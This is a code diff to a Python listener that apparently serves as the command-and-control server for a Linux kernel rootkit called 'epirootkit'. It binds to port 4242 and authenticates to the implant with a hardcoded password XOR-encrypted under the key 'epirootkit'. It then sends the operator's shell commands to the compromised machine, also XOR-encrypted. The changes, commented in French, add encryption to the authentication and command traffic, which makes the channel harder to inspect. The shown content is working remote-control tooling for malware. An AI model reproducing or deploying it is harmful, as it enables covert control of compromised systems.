@@ -4,21 +4,23 @@ KEY = b"epirootkit"
 HOST = "0.0.0.0"
 PORT = 4242
 
-
 def xor(data: bytes) -> bytes:
     return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))
 
-
 def handle_client(client):
     try:
-        client.sendall(b"epirootkit\n")
+        # Envoyer le mot de passe CHIFFRÉ avec un saut de ligne
+        password = b"epirootkit\n"  # Doit correspondre exactement au password dans le module kernel
+        encrypted_pass = xor(password)
+        client.sendall(encrypted_pass)
 
-        auth_response = client.recv(2048)
+        # Recevoir et déchiffrer la réponse
+        auth_response = xor(client.recv(2048)).decode(errors="ignore")
         print("--- AUTH ---")
-        print(auth_response.decode(errors="ignore").strip())
+        print(auth_response.strip())
         print("------------\n")
 
-        if b"FAIL" in auth_response:
+        if "FAIL" in auth_response:
             print("Authentication failed. Exiting.")
             return
 
@@ -27,7 +29,8 @@ def handle_client(client):
             if not cmd:
                 continue
 
-            encrypted = xor(cmd.encode())
+            # Envoyer la commande chiffrée
+            encrypted = xor(cmd.encode() + b"\n")  # Ajouter un saut de ligne
             client.sendall(encrypted)
 
             print("\n--- Response ---")
@@ -53,7 +56,6 @@ def handle_client(client):
     finally:
         client.close()
 
-
 def main():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -65,7 +67,6 @@ def main():
         print(f"[+] Connection from {addr[0]}:{addr[1]}")
 
         handle_client(client)
-
 
 if __name__ == "__main__":
     main()
